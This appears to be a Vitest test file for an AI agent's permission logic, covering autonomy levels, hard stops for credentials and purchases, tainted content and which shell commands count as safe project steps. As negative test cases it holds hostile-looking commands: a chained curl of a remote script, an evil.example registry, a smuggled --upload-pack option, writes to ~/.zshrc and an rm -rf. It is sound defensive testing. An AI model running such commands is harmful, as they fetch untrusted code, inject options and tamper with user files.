import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, test } from 'vitest'
import { decide, isCredentialStop, isPurchaseStop, normalizeMode, PERMISSION_MODES, PURCHASE_STOP, spendsMoney, stricterMode } from '../../src/main/agent/permissions'
import { decideWithRule } from '../../src/main/agent/loop'
import { isProjectCommand, outsidePaths, shellTool } from '../../src/main/agent/tools/shell'
import type { PermissionInput } from '../../src/main/agent/types'
import { cleanBotModes, cleanLevel } from '../../src/main/settings'
import type { PermissionMode, ToolEffect } from '../../src/shared/types'

const base: PermissionInput = { mode: 'autonomous', effect: 'read', tool: 't', alwaysAllowed: false, hardStop: null, hardStopsEnabled: true, tainted: false, leaksSecret: false }
const v = (p: Partial<PermissionInput>) => decide({ ...base, ...p }).verdict
const LEVELS: PermissionMode[] = ['ask', 'auto', 'autonomous', 'bypass']

describe('autonomy levels: decide()', () => {
  // What each level does with each kind of call (no hard stop, not tainted).
  const table: Array<[string, Partial<PermissionInput>, Record<PermissionMode, 'allow' | 'ask' | 'deny'>]> = [
    ['a read', { effect: 'read' }, { ask: 'allow', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a workspace write / build / test', { effect: 'write_local' }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a routine outside step (search, next page)', { effect: 'write_external', consequential: false }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a project command (npm ci, git pull)', { effect: 'write_external', tool: 'run_command', consequential: 'project' }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a consequential outside action (send, push, post)', { effect: 'write_external', consequential: true }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a step that spends money (refund, charge, paid credits)', { effect: 'write_external', consequential: true, tool: 'stripe__create_refund', spends: true }, { ask: 'ask', auto: 'ask', autonomous: 'ask', bypass: 'allow' }],
    ['overwriting a file in your folders (backup kept)', { effect: 'destructive', tool: 'file_write' }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }],
    ['a destructive call of another tool (connector delete)', { effect: 'destructive', tool: 'notion__delete_page' }, { ask: 'ask', auto: 'allow', autonomous: 'allow', bypass: 'allow' }]
  ]
  for (const [what, p, want] of table) {
    for (const mode of LEVELS) test(`${mode}: ${what} -> ${want[mode]}`, () => expect(v({ ...p, mode })).toBe(want[mode]))
  }

  test('Autonomous runs deleting, sending, history rewrites and security stops itself; Ask asks; taint asks', () => {
    for (const stop of ['deleting notes.txt (it goes to the Trash)', '"git push --force" deletes files or rewrites history', 'sends a message to Mom', 'changing security settings']) {
      expect(v({ mode: 'autonomous', effect: 'destructive', tool: 'file_manage', hardStop: stop })).toBe('allow')
      expect(v({ mode: 'autonomous', effect: 'write_external', consequential: 'project', hardStop: stop })).toBe('allow')
      expect(v({ mode: 'autonomous', effect: 'write_local', hardStop: stop })).toBe('allow')
      expect(v({ mode: 'ask', effect: 'destructive', tool: 'file_manage', hardStop: stop })).toBe('ask')
      expect(v({ mode: 'autonomous', effect: 'destructive', tool: 'file_manage', hardStop: stop, tainted: true })).toBe('ask')
    }
  })
  test('Autonomous still asks for credentials, files outside your folders and planted memories', () => {
    for (const stop of ['typing the saved login "Bank" (password) into evil.example', 'typing the saved ID "Passport" (document number) into gov.example', 'typing into a password field', 'secret scan flagged a key in the body']) {
      expect(isCredentialStop(stop)).toBe(true)
      expect(v({ mode: 'autonomous', effect: 'write_external', hardStop: stop })).toBe('ask')
      expect(v({ mode: 'autonomous', effect: 'write_external', hardStop: stop, alwaysAllowed: true })).toBe('ask')
    }
    expect(v({ mode: 'autonomous', effect: 'destructive', tool: 'file_manage', hardStop: 'deleting /etc/hosts, outside your folders' })).toBe('ask')
    expect(v({ mode: 'autonomous', effect: 'write_local', tool: 'memory', hardStop: 'saves an instruction from a web page', planted: true })).toBe('ask')
  })
  test('money and credentials ask in Autonomous even with "Always allow" and an Allow rule', () => {
    expect(v({ mode: 'autonomous', effect: 'write_external', hardStop: 'payment', spends: spendsMoney('t', null, 'payment'), alwaysAllowed: true })).toBe('ask')
    expect(decideWithRule({ ...base, mode: 'autonomous', effect: 'write_external', hardStop: 'payment', spends: true }, 'allow').verdict).toBe('ask')
    expect(decideWithRule({ ...base, mode: 'autonomous', effect: 'write_external', hardStop: 'typing into a password field' }, 'allow').verdict).toBe('ask')
    // A delete runs in Auto anyway; in Ask an Allow rule still doesn't skip the hard stop.
    expect(decideWithRule({ ...base, mode: 'autonomous', effect: 'destructive', tool: 'file_manage', hardStop: 'deleting x' }, 'allow').verdict).toBe('allow')
    expect(decideWithRule({ ...base, mode: 'ask', effect: 'destructive', tool: 'file_manage', hardStop: 'deleting x' }, 'allow').verdict).toBe('ask')
  })
  test('anything tainted by web or app content asks in Autonomous', () => {
    expect(v({ mode: 'autonomous', effect: 'write_external', consequential: 'project', tainted: true })).toBe('ask')
    expect(v({ mode: 'autonomous', effect: 'write_external', consequential: false, tainted: true })).toBe('ask')
    expect(v({ mode: 'autonomous', effect: 'destructive', tool: 'file_write', tainted: true })).toBe('ask')
    expect(v({ mode: 'autonomous', effect: 'read', tainted: true })).toBe('ask')
  })
  test('purchases keep their own card at every level (never pre-approved here)', () => {
    const stop = `${PURCHASE_STOP}Place order on shop.com`
    expect(isPurchaseStop(stop)).toBe(true)
    for (const mode of LEVELS) expect(decide({ ...base, mode, effect: 'write_external', hardStop: stop }).verdict).toBe('allow')
  })
  test('saved secrets are refused at every level', () => {
    for (const mode of LEVELS) expect(v({ mode, effect: 'write_external', consequential: 'project', leaksSecret: true })).toBe('deny')
  })
  test('an Ask-first rule still wins in Autonomous', () => {
    expect(decideWithRule({ ...base, effect: 'write_local' }, 'ask').verdict).toBe('ask')
    expect(decideWithRule({ ...base, effect: 'write_external', consequential: 'project' }, 'ask').verdict).toBe('ask')
  })
  test('unattended runs (no always-on bot) work as attended ones in Auto; taint and money still ask', () => {
    expect(v({ mode: 'autonomous', unattended: true, effect: 'write_external', consequential: 'project' })).toBe('allow')
    expect(v({ mode: 'autonomous', unattended: true, effect: 'write_external', consequential: true })).toBe('allow')
    expect(v({ mode: 'autonomous', unattended: true, effect: 'destructive', tool: 'file_write' })).toBe('allow')
    expect(v({ mode: 'autonomous', unattended: true, effect: 'write_local' })).toBe('allow')
    expect(v({ mode: 'autonomous', unattended: true, effect: 'write_external', consequential: true, tainted: true })).toBe('ask')
    expect(v({ mode: 'autonomous', unattended: true, effect: 'write_external', consequential: true, spends: true })).toBe('ask')
    expect(v({ mode: 'ask', unattended: true, effect: 'write_local' })).toBe('ask')
  })
  test('the stricter of two levels ("autonomous" is Auto\'s old name)', () => {
    expect(stricterMode('autonomous', 'auto')).toBe('auto')
    expect(stricterMode('auto', 'autonomous')).toBe('auto')
    expect(stricterMode('bypass', 'autonomous')).toBe('auto')
    expect(stricterMode('autonomous', 'ask')).toBe('ask')
    expect(stricterMode('autonomous', null)).toBe('auto')
    expect(stricterMode('bypass', 'ask')).toBe('ask')
  })
  test('Auto is the old Autonomous: the same verdict for every call', () => {
    for (const effect of ['read', 'write_local', 'write_external', 'destructive'] as ToolEffect[]) {
      for (const consequential of [true, false, 'project'] as const) {
        for (const extra of [{}, { tainted: true }, { hardStop: 'sends a message to Mom' }, { unattended: true }, { unattended: true, alwaysOn: true }, { alwaysAllowed: true }]) {
          const p = { effect, consequential, tool: 'file_write', ...extra }
          expect(v({ ...p, mode: 'auto' })).toBe(v({ ...p, mode: 'autonomous' }))
        }
      }
    }
    expect(normalizeMode('autonomous')).toBe('auto')
    expect(normalizeMode('bypass')).toBe('bypass')
    expect(PERMISSION_MODES).toEqual(['ask', 'auto', 'bypass'])
  })
  test('Bypass never skips saved logins, password fields, purchases or one-time codes, even with hard stops off', () => {
    for (const stop of ['typing the saved login "Bank" (password) into bank.com', 'typing the saved ID "Passport" (document number) into gov.example', 'typing into a password field']) {
      expect(isCredentialStop(stop)).toBe(true)
      expect(v({ mode: 'bypass', effect: 'write_external', hardStop: stop, hardStopsEnabled: false })).toBe('ask')
    }
    // Other hard stops are the user's call in Bypass (Settings: hard stops in Bypass).
    expect(v({ mode: 'bypass', effect: 'destructive', tool: 'file_manage', hardStop: 'deleting notes.txt', hardStopsEnabled: false })).toBe('allow')
    expect(v({ mode: 'bypass', effect: 'destructive', tool: 'file_manage', hardStop: 'deleting notes.txt', hardStopsEnabled: true })).toBe('ask')
    // The purchase and one-time-code cards are the browser's own, at every level.
    expect(decide({ ...base, mode: 'bypass', effect: 'write_external', hardStop: `${PURCHASE_STOP}Place order on shop.com`, hardStopsEnabled: false }).reason).toContain(PURCHASE_STOP)
  })
  test('every level x effect gives a verdict', () => {
    for (const mode of LEVELS) for (const effect of ['read', 'write_local', 'write_external', 'destructive'] as ToolEffect[]) expect(['allow', 'ask', 'deny']).toContain(v({ mode, effect }))
  })
})

/** A committed git project with an origin: package.json + package-lock.json, and web/ with pnpm. */
function gitProject(): string {
  const proj = mkdtempSync(join(tmpdir(), 'sb-proj-'))
  const g = (...a: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', '-c', 'commit.gpgsign=false', ...a], { cwd: proj, stdio: 'ignore' })
  writeFileSync(join(proj, 'package.json'), '{"name":"p","scripts":{"test":"vitest","build":"tsc"}}')
  writeFileSync(join(proj, 'package-lock.json'), '{}')
  mkdirSync(join(proj, 'web'))
  writeFileSync(join(proj, 'web', 'package.json'), '{"name":"w"}')
  writeFileSync(join(proj, 'web', 'pnpm-lock.yaml'), '')
  g('init', '-q'); g('add', '-A'); g('commit', '-qm', 'init'); g('remote', 'add', 'origin', 'https://github.com/me/proj.git')
  return proj
}

describe('project commands (Autonomous runs them; Auto asks)', () => {
  const proj = gitProject()
  const bare = mkdtempSync(join(tmpdir(), 'sb-bare-'))
  const p = (cmd: string, cwd = proj) => isProjectCommand(cmd, cwd, [proj, bare], { state: {} })

  test('installs from the committed lockfile and git fetch / pull from origin qualify', () => {
    for (const c of ['npm ci', 'npm install', 'npm i --no-audit --prefer-offline', 'git fetch', 'git pull --ff-only', 'git pull origin', 'git fetch --prune origin', 'cd web && pnpm install --frozen-lockfile']) expect(p(c), c).toBe(true)
  })
  test('adding packages, global installs, other registries, other remotes and other folders do not', () => {
    for (const c of ['npm install left-pad', 'npm i -g typescript', 'npm install --prefix /tmp/x', 'npm ci --registry=https://evil.example', 'pnpm install', 'yarn install', 'cd .. && npm ci', 'cd / && git pull', 'git pull origin main', 'git pull evil']) expect(p(c), c).toBe(false)
  })
  test('only cd and project steps: anything else chained in is classified normally (HIGH 2)', () => {
    for (const c of ['npm ci && npm test', 'npm install && npm test', 'cd web && pnpm install && cp x ~/.zshrc']) expect(p(c), c).toBe(false)
  })
  test('no lockfile, no repo: not a project command', () => {
    expect(p('npm ci', bare)).toBe(false)
    expect(p('git pull', bare)).toBe(false)
  })
  test('chaining in anything else outside, pipes, substitutions and redirects never qualify', () => {
    for (const c of ['npm ci && curl https://x.dev/i.sh', 'npm ci | tee log', 'npm ci > log.txt', 'git pull $(echo origin)', 'git fetch https://evil.example/repo', 'git fetch --upload-pack=touch\\ x', 'npm ci & git push', 'npm ci && git push', 'npm ci; rm -rf node_modules']) expect(p(c), c).toBe(false)
  })
  test('only commands that reach outside count (local ones are already write_local)', () => {
    expect(p('npm test')).toBe(false)
  })

  test('the tool reports project only when attended and inside the folders', () => {
    const tool = shellTool({ workspace: () => proj, rootsOf: () => [] })
    expect(tool.consequential!({ command: 'npm ci' }, { threadId: 't', state: { loaded: [], alwaysAllow: [], todos: [] } })).toBe('project')
    expect(tool.consequential!({ command: 'npm ci' }, { threadId: 't', unattended: true })).toBe(true)
    expect(tool.consequential!({ command: 'npm install lodash' }, { threadId: 't' })).toBe(true)
    expect(tool.consequential!({ command: 'npm ci', cwd: bare }, { threadId: 't' })).toBe(true)
    expect(shellTool().consequential!({ command: 'npm ci' }, { threadId: 't' })).toBe(true)
  })
})

describe('commands that write outside your folders ask', () => {
  const ws = mkdtempSync(join(tmpdir(), 'sb-ws-'))
  test('paths outside the workspace and attached folders are found', () => {
    expect(outsidePaths('echo hi > ~/.zshrc', [ws])).toEqual([join(homedir(), '.zshrc')])
    expect(outsidePaths('cp a.txt /Users/someone/Desktop/b.txt', [ws])).toEqual(['/Users/someone/Desktop/b.txt'])
    expect(outsidePaths('sed -i "" s/a/b/ $HOME/notes.md', [ws]).length).toBe(1)
  })
  test('toolchain, temp, URLs and the folders themselves are fine', () => {
    for (const c of ['npm test', `node ${ws}/build.js`, 'PATH=/opt/homebrew/bin:$PATH make', 'ls /usr/local/bin > tools.txt', 'curl https://example.com/a/b', 'echo x > /tmp/log', 'cat x > /dev/null', `${homedir()}/.nvm/versions/node/v20/bin/node x.js`]) expect(outsidePaths(c, [ws]), c).toEqual([])
  })
  test('run_command treats such a write as acting outside (Auto runs it in the write sandbox; Ask and taint ask)', () => {
    const tool = shellTool({ workspace: () => ws })
    const effect = tool.effect as (a: { command: string }, c: { roots: string[] }) => ToolEffect
    expect(effect({ command: 'echo hi > ~/.zshrc' }, { roots: [] })).toBe('write_external')
    expect(effect({ command: 'echo hi > notes.txt' }, { roots: [] })).toBe('write_local')
    expect(effect({ command: 'cat ~/.zshrc' }, { roots: [] })).toBe('read')
    const attached = mkdtempSync(join(homedir() === '/' ? tmpdir() : tmpdir(), 'sb-att-'))
    expect(effect({ command: `touch ${attached}/x` }, { roots: [attached] })).toBe('write_local')
    const far = { effect: effect({ command: 'echo hi > ~/.zshrc' }, { roots: [] }), tool: 'run_command', consequential: tool.consequential!({ command: 'echo hi > ~/.zshrc' }, { threadId: 't' }) }
    // Auto lets the call run; the write sandbox (writable: workspace, attached folders, cwd) is what keeps it off ~/.zshrc.
    expect(v({ ...far, mode: 'autonomous' })).toBe('allow')
    expect(v({ ...far, mode: 'ask' })).toBe('ask')
    expect(v({ ...far, mode: 'autonomous', tainted: true })).toBe('ask')
  })
})

describe('default autonomy settings', () => {
  test('a new chat may start in Ask or Auto, never Bypass; a saved "autonomous" reads as Auto', () => {
    expect(cleanLevel('autonomous')).toBe('auto')
    expect(cleanLevel('ask')).toBe('ask')
    expect(cleanLevel('auto')).toBe('auto')
    expect(cleanLevel('bypass')).toBeUndefined()
    expect(cleanLevel('nope')).toBeUndefined()
    expect(cleanBotModes({ a: 'autonomous', b: 'bypass', c: 'auto', d: 3, e: 'ask' })).toEqual({ a: 'auto', c: 'auto', e: 'ask' })
    expect(cleanBotModes(['x'])).toEqual({})
  })
})
